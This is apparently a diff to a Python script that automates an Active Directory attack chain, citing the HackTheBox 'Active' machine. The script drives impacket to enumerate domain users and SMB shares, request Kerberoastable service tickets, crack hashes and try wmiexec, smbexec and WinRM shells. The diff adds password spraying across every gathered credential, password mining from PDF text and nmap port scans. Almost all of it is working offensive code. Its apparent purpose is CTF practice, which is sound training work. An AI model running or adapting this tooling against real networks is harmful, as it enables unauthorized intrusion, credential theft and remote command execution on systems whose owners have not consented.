@@ -2,7 +2,7 @@ import time
 import coloredlogs, logging
 import argparse
 from io import BytesIO
-from os import path, mkdir, remove
+from os import path, mkdir, path, remove
 import subprocess
 
 from impacket.smbconnection import SMBConnection, SessionError
@@ -20,6 +20,28 @@ import zipfile
 import re
 import traceback
 import winrm
+from english_words import get_english_words_set
+
+import nltk
+nltk.download('wordnet')      
+
+import hashlib
+
+import nmap3
+
+def getmd5(filename):
+ return hashlib.md5(open(filename,'rb').read()).hexdigest()
+
+# From https://www.reddit.com/r/learnpython/comments/g1sdkh/comment/fnhdecy/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button
+from collections import Counter
+from math import log
+
+def shannon(string):
+  counts = Counter(string)
+  frequencies = ((i / len(string)) for i in counts.values())
+  return - sum(f * log(f, 2) for f in frequencies)
+
+lemma = nltk.stem.WordNetLemmatizer()
 
 # https://app.hackthebox.com/machines/Active
 
@@ -35,7 +57,11 @@ parser.add_argument('--credentials', help='File with initial list of credentials
 parser.add_argument('--credential', help='Initial credential, format "username:password"')
 
 hash_file_name = path.join(gettempdir(), "hash.txt")
-remove(hash_file_name)
+if path.exists(hash_file_name):
+    remove(hash_file_name)
+
+known_files = set()
+
 
 _fid, GITLEAKS_DEFAULT_CONFIG_FILE = mkstemp()
 
@@ -43,10 +69,12 @@ with open(GITLEAKS_DEFAULT_CONFIG_FILE, "w") as cfg:
     cfg.write(requests.get(gl_m.GITLEAKS_DEFAULT_CONFIG_FILE).text)
 
 usernames_to_test = ["", "guest"]
-usernames = set()
+usernames = set(usernames_to_test)
 passwords = set()
 
 credentials = {}
+
+web2lowerset = get_english_words_set(['web2'], lower=True)
 
 def save_creds(username, password):
     credentials[username] = password
@@ -110,8 +138,29 @@ def list_files_in_share(connection, share_name, path, depth, tmp_dir):
         
             logger.debug(f"Type of {current_file_name} " + file_magic)
 
+            hash_filename = getmd5(current_file_name)
+
+            if hash_filename in known_files:
+                continue
+
+            known_files.add(hash_filename)
+
             if name == "Groups.xml":
                 parse_groups_xml(output)
+            elif file_magic.startswith("PDF document"):
+                subprocess.run(["pdftotext", current_file_name, current_file_name+".txt"])
+                data = open(current_file_name+".txt").read().split()
+                words = [x for x in data if lemma.lemmatize(x.lower()) not in web2lowerset and len(x) > 5]
+                possible_passwords = sorted([(x,shannon(x.lower())) for x in words], key=lambda t: -t[1])
+                
+                print("Potential passwords in PDF: ")
+                for i, password in enumerate(possible_passwords):
+                    print(f" - {i}: {password}")
+                
+                index = int(input("Index of password to keep? "))
+                
+                passwords.add(possible_passwords[index][0])
+
             elif file_magic.startswith("Zip archive data"):
                 try:
                     with zipfile.ZipFile(current_file_name, 'r') as zip_ref:
@@ -128,6 +177,8 @@ def scan_for_secrets(tmp_dir):
 def ldap_find_kerberoasting(ip, domain, username, password):
     escaped_username = username.replace("\\", "/")
     get_user_spns_command = ["GetUserSPNs.py", domain + "/" + escaped_username + ":" + password, "-dc-ip", ip, "-request"]
+    if password == "":
+        get_user_spns_command.append("-no-pass")
     print(get_user_spns_command)
     result = subprocess.run(get_user_spns_command, capture_output=True, text=True, check=True)
     output = result.stdout
@@ -163,6 +214,8 @@ def crack_hashes():
 def test_wmiexec(ip, domain, username, password):
     logger.info(f"Testing wmiexec to get access as {username}")
     wmiexec_command = ["impacket-wmiexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
+    if password == "":
+        wmiexec_command.append("-no-pass")
     result = subprocess.run(wmiexec_command, capture_output=True)
     if result.returncode == 0:
         logger.warning(f"Getting access to shell with wmiexec {username}:{password}")
@@ -230,6 +283,8 @@ def list_users(ip, domain, username, password):
     logger.info(f"Listing RPC users as {username}...")
     regex = r".*: .*\\(.*) \((.*)\)"
     sid_command = ["impacket-lookupsid", f"{domain}/{username}:{password}@{ip}"]
+    if password == "":
+        sid_command.append("-no-pass")
     result = subprocess.run(sid_command, capture_output=True)
     if result.returncode == 0:
         output = result.stdout.decode()
@@ -238,11 +293,18 @@ def list_users(ip, domain, username, password):
         for _matchNum, match in enumerate(matches, start=1):
             username = match.group(1)
             sid_type = match.group(2)
-            if sid_type == "SidTypeUser":
+            if sid_type == "SidTypeUser" and  username not in usernames:
                 logger.info(f"New username discovered: {username}")
                 usernames.add(username)
+                usernames_to_test.append(username)
     else:
         print(result)
+
+def scan_ports(ip):
+    nmap = nmap3.Nmap()
+    results = nmap.scan_top_ports(ip)
+    return results[ip]['ports']
+
 
 if __name__ =="__main__":
     args = parser.parse_args()
@@ -263,25 +325,27 @@ if __name__ =="__main__":
     i = 0
     while i < len(usernames_to_test):
         username = usernames_to_test[i]
-        password = credentials.get(username, "")
-        list_users(ip, domain, username, password)
 
-        try:
-            list_shares(ip, user=username, password='')
-        except Exception:
-            logger.info(f"Unable to list SMB with {username}")
+        passwords_to_test = [""]
 
-        try:
-            list_shares(ip, user=username, password=password)
-        except Exception as e:
-            logger.info(f"Unable to list SMB with {username}:{password}")
-            logger.debug(e)
+        if username in credentials:
+            passwords_to_test.append(credentials[username])
+        
+        passwords_to_test = passwords_to_test + [*passwords]
+        for password in passwords_to_test:
+            list_users(ip, domain, username, password)
 
-        ldap_find_kerberoasting(ip, domain, username, password)
+            try:
+                list_shares(ip, user=username, password=password)
+            except Exception as e:
+                logger.info(f"Unable to list SMB with {username}:{password}")
+                logger.debug(e)
 
-        test_wmiexec(ip, domain, username, password)
-        test_smbexec(ip, domain, username, password)
-        test_winrm(ip, domain, username, password)
+            ldap_find_kerberoasting(ip, domain, username, password)
+
+            test_wmiexec(ip, domain, username, password)
+            test_smbexec(ip, domain, username, password)
+            test_winrm(ip, domain, username, password)
 
         i = i + 1
 
